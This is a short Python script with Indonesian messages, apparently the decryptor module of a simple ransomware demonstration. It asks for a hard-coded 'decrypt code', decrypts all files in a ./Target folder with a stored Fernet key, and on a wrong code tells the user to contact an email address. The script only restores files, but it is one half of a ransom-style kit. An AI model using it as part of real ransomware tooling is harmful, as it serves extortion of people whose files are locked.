import os
from cryptography.fernet import Fernet

TargetPath = "./Target"
files = []

for file in os.listdir(TargetPath):
    files.append(file)

# secret key
with open("key_pass.key", "rb") as key:
    secretKey = key.read()

password = "nxtrix_0600"

userPass = str(input("Masukkan kode decrypt : "))

if(password == userPass):

    # decrypt content
    for file in files:
        completeName = os.path.join(TargetPath, file)
        with open(completeName, "rb") as theFileEnc:
            contents = theFileEnc.read()
        content_dec = Fernet(secretKey).decrypt(contents)
        with open(completeName, "wb") as theFileEnc:
            theFileEnc.write(content_dec)
        # remove extension hack
        base = os.path.splitext(completeName)
        # file_rec = base[0]
        file_rec = os.path.splitext(completeName)[0]
        os.rename(completeName, file_rec)
    print("Selamat!! File kamu berhasil di dipulihkan!!")
    print("=========== HATI-HATI DENGAN MALWARE / SALAM CYBER ===========")
    print("")
    print("")
else:
    print("Kode Yang anda masukkan salah, silahkan hubungi nofrisdan@nxtrix.com !!")
    print("")
    print("")
